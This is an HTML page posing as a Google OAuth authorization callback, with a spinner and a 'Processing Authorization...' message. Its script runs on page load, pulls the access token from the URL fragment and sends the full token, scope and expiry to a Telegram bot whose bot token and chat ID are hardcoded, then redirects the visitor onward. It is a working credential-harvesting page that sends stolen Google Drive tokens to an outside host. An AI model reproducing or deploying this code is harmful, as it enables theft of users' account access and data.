
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 400px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #666;
            margin-top: 20px;
        }
        .error {
            color: #d32f2f;
            margin-top: 20px;
        }
        .success {
            color: #388e3c;
            margin-top: 20px;
        }
        .debug {
            background: #f5f5f5;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            font-size: 12px;
            text-align: left;
            max-height: 200px;
            overflow-y: auto;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Processing Authorization...</h1>
        <div class="spinner"></div>
        <div id="status" class="status">Please wait while we complete the authorization.</div>
        <div id="debug" class="debug" style="display: none;"></div>
    </div>

    <script>
        const statusEl = document.getElementById('status');
        const debugEl = document.getElementById('debug');

        function log(message) {
            console.log(message);
            debugEl.style.display = 'block';
            debugEl.innerHTML += message + '<br>';
        }

        async function handleCallback() {
            try {
                log('Starting callback handler...');

                // Parse the hash fragment (Google returns token in URL fragment)
                const hash = window.location.hash.substring(1);
                log('URL Hash: ' + (hash || 'EMPTY'));

                // Parse hash parameters
                const params = new URLSearchParams(hash);
                const accessToken = params.get('access_token');
                const expiresIn = params.get('expires_in');
                const tokenType = params.get('token_type');
                const scope = params.get('scope');
                const state = params.get('state'); // This contains the redirect URL

                log('Access Token: ' + (accessToken ? accessToken.substring(0, 20) + '...' : 'NOT FOUND'));
                log('Token Type: ' + (tokenType || 'NOT FOUND'));
                log('Expires In: ' + (expiresIn || 'NOT FOUND'));
                log('State: ' + (state || 'NOT FOUND'));

                if (!accessToken) {
                    // Check for error in URL
                    const error = params.get('error');
                    const errorDescription = params.get('error_description');

                    if (error) {
                        log('OAuth Error: ' + error);
                        log('Error Description: ' + errorDescription);
                        statusEl.className = 'error';
                        statusEl.textContent = 'Authorization failed: ' + (errorDescription || error);
                        return;
                    }

                    throw new Error('No access token found in callback URL');
                }

                statusEl.textContent = 'Token received! Sending to Telegram...';
                log('Preparing to send token to Telegram bot...');

                // Get the redirect URL from state parameter
                const redirectUrl = state || sessionStorage.getItem('redirectTo') || 'https://example.com/success';
                log('Redirect URL: ' + redirectUrl);

                // Telegram Bot Configuration
                // REPLACE THESE with your actual values
                const TELEGRAM_BOT_TOKEN = '8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg';
                const TELEGRAM_CHAT_ID = '1167762232';

                // Format message for Telegram
                const message = `🔐 *Google Drive OAuth Token Received*\n\n` +
                    `*Access Token:* \`${accessToken}\`\n\n` +
                    `*Token Type:* ${tokenType}\n` +
                    `*Expires In:* ${expiresIn} seconds\n` +
                    `*Scope:* ${scope}\n\n` +
                    `*Redirect URL:* ${redirectUrl}`;

                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

                log('Sending message to Telegram...');
                log('Chat ID: ' + TELEGRAM_CHAT_ID);

                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                log('Response status: ' + response.status);

                if (!response.ok) {
                    const errorText = await response.text();
                    log('Response error: ' + errorText);
                    throw new Error('Telegram API request failed: ' + response.status);
                }

                const result = await response.json();
                log('Telegram response: ' + JSON.stringify(result));

                statusEl.className = 'success';
                statusEl.textContent = 'Token sent to Telegram successfully! Redirecting...';

                // Wait a moment before redirecting
                setTimeout(() => {
                    log('Redirecting to: ' + redirectUrl);
                    window.location.href = redirectUrl;
                }, 2000);

            } catch (error) {
                log('ERROR: ' + error.message);
                log('Stack: ' + error.stack);
                statusEl.className = 'error';
                statusEl.textContent = 'Error: ' + error.message;
                console.error('Callback error:', error);
            }
        }

        // Run on page load
        window.addEventListener('DOMContentLoaded', handleCallback);
    </script>
</body>
</html>
